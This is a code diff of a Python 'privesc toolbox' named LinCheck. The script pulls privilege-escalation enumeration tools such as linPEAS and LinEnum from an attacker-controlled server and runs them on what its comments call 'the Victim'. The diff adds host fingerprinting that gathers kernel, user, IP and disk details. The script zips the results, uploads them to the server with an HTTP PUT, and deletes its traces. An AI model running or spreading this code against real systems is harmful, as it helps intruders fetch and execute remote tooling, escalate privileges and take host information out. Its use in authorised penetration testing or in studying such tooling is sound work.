@@ -1,12 +1,13 @@
-import argparse
-import sys
-import requests
 import os
-import subprocess
-import time
+from argparse import ArgumentParser
+from sys import stdout, argv, exit
+from subprocess import Popen, STDOUT, PIPE
+from platform import system, machine, release, node, platform, architecture
+from shutil import disk_usage, rmtree
+from time import time, sleep, strftime, gmtime
 from zipfile import ZipFile
-import shutil
-import glob
+from glob import glob
+from requests import get, put
 
 
 def login():
@@ -44,11 +45,10 @@ def login():
     Thanks to all Other tools that made it happened                                       
     Modular Privesc ToolBox                                                               
     Add or Remove Tools as you want just with 4 lines and 6 lines for make it look good ;)
+""")
 
-    """)
 
-
-parser = argparse.ArgumentParser(description='Example: LinCheck.py -i 127.0.0.1 -b (Basic Scan) ')
+parser = ArgumentParser(description='Example: LinCheck.py -i 127.0.0.1 -b (Basic Scan) ')
 parser.add_argument('-i', '--server', type=str, metavar='', required=True, help='The Privesc Server IP.')
 group = parser.add_mutually_exclusive_group()
 group.add_argument('-b', '--basic', action='store_true', help='Run Basic LinCheck Scan (2 Tools) . ')
@@ -57,7 +57,6 @@ group.add_argument('-f', '--full', action='store_true', help='Run Full LinCheck 
 args = parser.parse_args()
 
 SERVER_IP = args.server
-
 
 def work_space(directory, mode):
     # Create The work Space of the program
@@ -71,7 +70,7 @@ def LinCheck(cmd, url, output_file, input_file):
     # write the output to file
     # Remove the tool form the Victim
 
-    req = requests.get(url)
+    req = get(url)
     if req.status_code == 200:
         file = open(input_file, 'wb')
         file.write(req.content)
@@ -80,15 +79,15 @@ def LinCheck(cmd, url, output_file, input_file):
         print("[!] The Privesc Server is Unavailable..\n[-] Bye Bye ... ")
         exit()
 
-    time.sleep(1)
+    sleep(1)
     execute = 'chmod 700 {}'.format(input_file)
     os.popen(execute)
-    time.sleep(1)
+    sleep(1)
     with open(output_file, 'w') as report:  # replace 'w' with 'wb' for Python 3
         report.write('\n[$*] Starting {} Report '.format(output_file))
-        process = subprocess.Popen(cmd, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+        process = Popen(cmd, shell=True, stderr=STDOUT, stdout=PIPE)
         for line in iter(process.stdout.readline, b''):  # replace '' with b'' for Python 3
-            sys.stdout.write(line.decode(encoding='utf-8', errors='ignore'))
+            stdout.write(line.decode(encoding='utf-8', errors='ignore'))
             report.write(line.decode(encoding='utf-8', errors='ignore'))
         report.write('\n[$!]Done {} Report '.format(output_file))
         report.close()
@@ -100,7 +99,7 @@ def edit_and_send(directory, mode):
     # Sort the the final report and remove duplicate (Some duplicate lines because the output of the original tool)
     # Zip the folder with all the reports and send it to the Privesc Server with PUT method and cleans al the files
 
-    read_files = glob.glob("*.txt")
+    read_files = glob("*.txt")
     base_name = directory + '-' + mode
     with open("result.txt", "wb") as outfile:
         for f in read_files:
@@ -125,7 +124,7 @@ def edit_and_send(directory, mode):
     print('Following files will be zipped:')
     for file_name in file_paths:
         print(file_name)
-        time.sleep(0.5)
+        sleep(0.5)
     with ZipFile(base_name + '.zip', 'w', allowZip64=True) as zip:
         for file in file_paths:
             zip.write(file)
@@ -134,17 +133,61 @@ def edit_and_send(directory, mode):
     headers = {'Content-Type': 'text/plain'}
     url = 'http://' + SERVER_IP + ':8200/{}.zip'.format(base_name)
     file = {'file': ('FinelReport', open(base_name + '.zip', 'rb'), 'application/octet-stream')}
-    requests.put(url, headers=headers, files=file, verify=False)
+    put(url, headers=headers, files=file, verify=False)
     zip.close()
     file['file'] = 'FinelReport', open(base_name + '.zip', 'rb').close(), 'application/octet-stream'
     os.remove(base_name + ".zip")
-    shutil.rmtree(base_name)
+    rmtree(base_name)
 
+
+def user_choice(mode):
+    user_accept = input('[?] Are you want to Continue ? (Y/n) '.lower())
+
+    while user_accept != 'n' and user_accept != 'y':
+        print('[!] Not Valid Option Select (Y or N) ')
+        user_accept = input('\n[?] Are you want to Continue ? (Y/n) '.lower())
+
+    if user_accept == 'n':
+        print('[!] Deleting All files..')
+        os.chdir('..')
+        rmtree(os.uname()[1] + '-{}'.format(mode))
+        print('[!] Bye Bye...')
+        exit()
+    else:
+        pass
+
+
+def sysinfo():
+    total, used, free = disk_usage("/")
+    kernel_version = os.popen("uname -v").read()
+    kernel = os.popen("uname -or").read()
+    cpu_name = os.popen("lscpu |grep name | awk '{ print substr($0, index($0,$3)) }'").read()
+    os_version = os.popen("uname -o").read()
+    boot_time_linux = os.popen("uptime").read()
+    system_resu = os.popen("xdpyinfo | grep dimensions ").read()
+    ip = os.popen('ip addr show eth0').read().split("inet ")[1].split("/")[0]
+
+    print("\t[*] Kernel: " + kernel.strip('\n'))
+    print("\t[*] Kernel Version: " + kernel_version.strip('\n'))
+    print("\t[*] CPU Name: " + cpu_name.strip('\n'))
+    print("\t[*] OS: " + system())
+    print("\t[*] OS Version: " + os_version.strip('\n'))
+    print("\t[*] Machine: " + machine())
+    print("\t[*] OS Release: " + release())
+    print("\t[*] Host name: " + node())
+    print("\t[*] Machine Platform: " + platform())
+    print("\t[*] Architect: " + architecture()[0])
+    print("\t[*] Login Name: " + os.getlogin())
+    print("\t[*] Local IP: " + ip)
+    print("\t[*] Resolution: " + system_resu.strip('\n'))
+    print("\t[*] Boot Time: " + boot_time_linux.strip('\n'))
+    print("\t[*] Hard drive: " + "Total: %d GB " % (total // (2 ** 30)) + "\tUsed: %d GB "
+          % (used // (2 ** 30))
+          + "\tFree: %d GB" % (free // (2 ** 30)))
 
 '''
 All The Tools in This Script
 '''
-
 
 def linPEAS(base_url):
     # linPEAS
@@ -270,71 +313,64 @@ def uptux(base_url):
     print('\n[+] Done uptux Scan.\n ')
 
 
-def user_choice(mode):
-    user_accept = input('[?] Are you want to Continue (Y/N) ? '.lower())
-
-    while user_accept != 'n' and user_accept != 'y':
-        print('[!] Not Valid Option Select (Y or N) ')
-        user_accept = input('\n[?] Are you want to Continue (Y/N) ? '.lower())
-
-    if user_accept == 'n':
-        print('[!] Deleting All files..')
-        os.chdir('..')
-        shutil.rmtree(os.uname()[1] + '-{}'.format(mode))
-        print('[!] Bye Bye...')
-        exit()
-    else:
-        pass
-
-
 def main():
     base_url = "http://" + SERVER_IP + ":8200/Privesc_Tools/LinCheck/"
 
-    if len(sys.argv) < 4:
+    if len(argv) < 4:
         print("[?] What Type of LinCheck Scan would you like to run? ")
         print(parser.format_help())
 
     if args.basic:
         login()
+        print('[*] Basic Host Information:')
+        sysinfo()
+        sleep(1)
         work_space(directory=os.uname()[1], mode='Basic')
         print(
-            '[!] Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Basic\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 5 Minutes **\n'.format(
+            '\n[!] LinCheck Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Basic\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 5 Minutes **\n'.format(
                 SERVER_IP, os.getcwd()))
+
         user_choice(mode='Basic')
-        start_time = time.time()
+        start_time = time()
         print('[*] Running Basic LinCheck scan')
         linPEAS(base_url)
         LinEnum(base_url)
         SUID3NUM(base_url)
         edit_and_send(directory=os.uname()[1], mode='Basic')
-        seconds = time.time() - start_time
-        print('[$] Done Basic LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))
+        seconds = time() - start_time
+        print('[$] Done Basic LinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))
 
     elif args.advanced:
         login()
+        print('[*] Basic Host Information:')
+        sysinfo()
+        sleep(1)
         work_space(directory=os.uname()[1], mode='Advanced')
         print(
-            '[!] Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Advanced\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 9 Minutes **\n'.format(
+            '\n[!] LinCheck Settings:\n\t[*] Server IP: {}\n\t[*] Mode: Advanced\n\t[*] Work Space: {}\n\t[*] Estimated Run time: ** 9 Minutes **\n'.format(
                 SERVER_IP, os.getcwd()))
         user_choice(mode='Advanced')
-        start_time = time.time()
+        start_time = time()
         print('[+] Running Advanced LinCheck scan')
         linPEAS(base_url)
         LinEnum(base_url)
         les(base_url)
         PE(base_url)
         edit_and_send(directory=os.uname()[1], mode='Advanced')
-        seconds = time.time() - start_time
-        print('[$] Done Advanced LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))
+        seconds = time() - start_time
+        print('[$] Done Advanced LinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))
 
     elif args.full:
         login()
+        print('[*] Basic Host Information:')
+        sysinfo()
+        sleep(1)
         work_space(directory=os.uname()[1], mode='Full')
         print(
-            '[!] Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 12 Minutes ** \n'.format(
+            '\n[!] LinCheck Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 12 Minutes ** \n'.format(
                 SERVER_IP, os.getcwd()))
         user_choice(mode='Full')
-        start_time = time.time()
+        start_time = time()
         print('[+] Running Full LinCheck scan')
         linPEAS(base_url)
         LinEnum(base_url)
@@ -347,8 +383,8 @@ def main():
         SUID3NUM(base_url)
         uptux(base_url)
         edit_and_send(directory=os.uname()[1], mode='Full')
-        seconds = time.time() - start_time
-        print('[$] Done Full LinCheck scan in: ', time.strftime("%H:%M:%S", time.gmtime(seconds)))
+        seconds = time() - start_time
+        print('[$] Done Full LinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))
 
 
 if __name__ == '__main__':
